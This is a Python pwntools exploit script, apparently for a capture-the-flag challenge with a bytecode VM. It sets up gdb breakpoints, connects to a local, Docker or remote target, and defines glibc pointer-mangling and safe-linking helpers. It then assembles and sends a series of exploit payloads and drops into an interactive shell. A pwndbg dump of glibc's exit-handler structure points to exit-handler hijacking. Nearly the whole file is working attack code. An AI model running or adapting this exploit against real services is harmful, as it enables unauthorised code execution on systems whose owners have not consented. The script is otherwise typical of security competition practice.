#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''

#cymbol -f ./types.h
cymbol -l ./types

define dump
    p *(VM*)($base("heap") + 0xbb0)
end

# opcode dispatcher
# brva 0x14AD

# memcpy
brva 0x1874

# exit from main
brva 0x1DD4

# pop reg
# brva 0x16D2


dir  /home/rivit/workspace/github/glibc
set substitute-path /usr/src/debug/glibc /home/rivit/workspace/github

continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


import subprocess

def send_payload(f):
    info(f'{f} payload')
    subprocess.check_call(f"nasm -f bin {f}.asm -o {f}", shell=True)
    payload = open(f, "rb").read()
    io.sendlineafter(b"[ lEn? ] >> ", str(len(payload)).encode())
    io.sendafter(b"[ BYTECODE ] >>", payload)

send_payload('exp')
send_payload('exp1.5')
send_payload('exp2')
send_payload('noop')


send_payload('exp3')
send_payload('noop')

send_payload('exp4')



"""
pwndbg> p/x initial
$3 = {
  next = 0x0,
  idx = 0x1,
  fns = {{
      flavor = 0x4,
      func = {
        at = 0xecb37cd3f350c8d2,
        on = {
          fn = 0xecb37cd3f350c8d2,
          arg = 0x0
        },
        cxa = {
          fn = 0xecb37cd3f350c8d2,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    }, {
      flavor = 0x0,
      func = {
        at = 0x0,
        on = {
          fn = 0x0,
          arg = 0x0
        },
        cxa = {
          fn = 0x0,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    } <repeats 31 times>}
}

pwndbg> dq &initial
00007ffff7fb6000     0000000000000000 0000000000000001
00007ffff7fb6010     0000000000000004 ecb37cd3f350c8d2
00007ffff7fb6020     0000000000000000 0000000000000000
00007ffff7fb6030     0000000000000000 0000000000000000

"""


ia()
